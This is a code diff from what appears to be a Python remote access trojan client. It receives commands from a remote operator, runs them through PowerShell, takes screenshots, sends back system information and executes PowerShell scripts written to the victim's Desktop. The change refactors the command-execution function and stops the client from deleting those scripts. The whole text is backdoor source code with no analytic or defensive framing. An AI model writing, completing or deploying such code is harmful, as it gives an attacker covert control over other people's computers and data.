@@ -138,7 +138,7 @@ def receive_commands():
             command_result = take_screenshot_and_convert_to_string()
 
         else:
-            command_result = execute_command(received_command)
+            command_result = execute_command(received_command, "-command")
 
         if received_command[0] == "whoami":
             reliable_send(get_system_info())
@@ -152,13 +152,13 @@ def receive_commands():
 
 def run_powerShell_script(data):
     try:
-        desktop_path = os.path.join(os.path.join(
-            os.environ['USERPROFILE']), 'Desktop')
+        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
         file_path = os.path.join(desktop_path, "test.ps1")
+        
 
         write_file(path=file_path, content=data)
-        result = execute_command("PowerShell -File " + file_path)
-        os.remove(file_path)
+        result = execute_command([file_path], "-file")
+        # os.remove(file_path)
         return result
     except Exception as ex:
         return ("[Error] from run powershell script \n" + str(ex))
@@ -180,11 +180,13 @@ def get_system_info():
 
 # Execute command
 
-def execute_command(received_command):
+def execute_command(received_command, typ_of_command):
     try:
-        powerShell_command = ["powershell", "-command", " ".join(received_command)]
-        result = subprocess.run(
-            powerShell_command, capture_output=True, text=True)
+        powerShell_command = ["powershell", f'{typ_of_command}', " ".join(received_command)]
+        print("----------------------------------")
+        # path = os.path.normpath()
+        # print(powerShell_command)
+        result = subprocess.run(powerShell_command, capture_output=True, text=True)
 
         if result.returncode == 0:
             # execute was success
